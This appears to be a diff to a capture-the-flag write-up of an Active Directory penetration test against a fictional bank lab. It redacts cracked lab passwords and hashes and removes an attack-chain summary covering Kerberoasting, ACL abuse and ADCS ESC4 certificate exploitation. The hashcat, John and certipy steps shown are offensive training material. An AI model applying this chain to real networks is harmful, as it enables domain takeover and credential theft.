@@ -18,7 +18,6 @@ tags: ["active-directory", "bloodhound", "kerberoast", "acl-abuse", "writeaccoun
 
 404 Bank, a staple of the local financial community, is conducting its annual security assessment. To uphold their motto of being **"Proven, Local, Strong,"** the bank has commissioned the Hack Smarter Red Team to perform an internal penetration test.
 
-**Platform:** HackSmarter
 **Difficulty:** Medium
 **OS:** Windows Server 2019
 
@@ -224,22 +223,22 @@ GLIBC_2.34
 PTE1
 u+UH
 Welcome to CorpBank SecureAccess v3.7.2\n
-DEBUG: ZGQyZWYzNDUzMGRlN2U1YmVmMjJhMDVlN2U1ZGQxNzg=\n
+DEBUG: [REDACTED]\n
 ```
 
 Decoding the Base64 value and cracking the resulting MD5 hash:
 
 ```
-Exegol > echo 'ZGQyZWYzNDUzMGRlN2U1YmVmMjJhMDVlN2U1ZGQxNzg=' | base64 -d
-dd2ef34530de7e5bef22a05e7e5dd178#
+Exegol > echo '[REDACTED]' | base64 -d
+[HASH REDACTED]
 
-echo 'dd2ef34530de7e5bef22a05e7e5dd178' > /tmp/corp_hash.txt
+echo '[HASH REDACTED]' > /tmp/corp_hash.txt
 hashcat -m 0 /tmp/corp_hash.txt /usr/share/wordlists/rockyou.txt --force
 ```
 
 ```
 Exegol > hashcat -m 0 /tmp/corp_hash.txt --show
-dd2ef34530de7e5bef22a05e7e5dd178:[REDACTED]
+[HASH REDACTED]:[REDACTED]
 ```
 
 ### Password Spraying
@@ -533,7 +532,7 @@ Examining deleted emails in the Trash reveals critical information:
 
 **Email 2 - Credential Sharing:**
 > Hi Jan, Since Daniel Hoffmann seems to believe email is a one-way communication channel these days, I'm sharing his access credentials with you directly so we can finally move things along.
-> Please make sure Daniel gets the following password: **RemoteAccess!2024**
+> Please make sure Daniel gets the following password: **[REDACTED]**
 
 **Email 3 - svc.services Deactivation Notice:**
 > As part of our ongoing security measures, the service account **svc.services** has been temporarily deactivated by **Robert Graef** following a detected unauthorized access attempt involving ESC certificate vulnerabilities.
@@ -609,7 +608,7 @@ Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 SSE2 4x])
 Cost 1 (HMAC size [KiB]) is 1 for all loaded hashes
 Will run 32 OpenMP threads
 Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
-DontmesswithTexas (config_backup.zip/config.dat)
+[REDACTED] (config_backup.zip/config.dat)
 1g 0:0:00:00 DONE (2026-02-06 14:46) 33.33g/s 10733p/s 10733c/s 10733C/s 404Finance..you're
 Session completed
 ```
@@ -864,46 +863,6 @@ To restore the template after exploitation:
 
 ```bash
 certipy template -dc-ip 10.1.152.151 -u svc.services -p '[REDACTED]' -template Vuln-ESC4 -target DC-404.404finance.local -configuration Vuln-ESC4.json
-```
-
----
-
-## Attack Chain Summary
-
-```
-Phase 1 - Initial Enumeration
-─────────────────────────────────────────────────────────────────
-Website Scraping     → 6 employee names discovered
-username-anarchy     → 86 username permutations generated
-Kerbrute             → 5 valid domain users confirmed
-
-Phase 2 - Initial Access (Binary Analysis)
-─────────────────────────────────────────────────────────────────
-CorpBankDialer.exe   → MD5 hash extracted from DEBUG string
-karl.hackermann      : [REDACTED]          → Password spray success
-
-Phase 3 - Targeted Kerberoast (GenericWrite)
-─────────────────────────────────────────────────────────────────
-tom.reboot           : [REDACTED]          → SPN set + Kerberoasted
-
-Phase 4 - ACL Abuse (ForceChangePassword)
-─────────────────────────────────────────────────────────────────
-robert.graef         : [REDACTED]          → Password reset via tom.reboot
-
-Phase 5 - WriteAccountRestrictions Abuse
-─────────────────────────────────────────────────────────────────
-daniel.hoffmann      : RemoteAccess!2024   → Recovered from deleted email
-webadmin             : [REDACTED]          → Password reset via daniel.hoffmann
-
-Phase 6 - Service Account Recovery
-─────────────────────────────────────────────────────────────────
-svc.services         : [REDACTED]          → Credentials from config_backup.zip
-                                              (cracked with CeWL wordlist)
-
-Phase 7 - ADCS ESC4 Exploitation
-─────────────────────────────────────────────────────────────────
-Administrator        : [NT HASH]           → Certificate abuse via Vuln-ESC4
-                                              DOMAIN OWNED
 ```
 
 ---
